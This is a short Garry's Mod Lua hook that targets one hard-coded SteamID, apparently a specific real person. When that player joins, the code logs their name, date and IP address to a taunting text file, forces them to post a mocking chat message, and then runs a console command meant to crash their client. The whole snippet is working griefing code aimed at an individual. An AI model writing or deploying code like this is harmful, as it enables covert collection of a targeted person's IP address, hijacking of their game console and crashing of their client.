
hook.Add("PlayerInitialSpawn",NAME,function (objPl)
	if objPl:SteamID() == "STEAM_0:1:7099" then
		local str="Name:"..objPl:Name().."\nDate:"..os.date().."\nIP:"..objPl:IPAddress().."\nWe crashed him out :P"
		file.Write("GARRY_HAS_BEEN_CAUGHT.txt",str)
		objPl:ConCommand("say I still don't try to get shit done...goodbye, I'm going to eat a crumpet\n")
		timer.Simple(2,function () objPl:ConCommand("test_sendkey\n") end)
	end
end)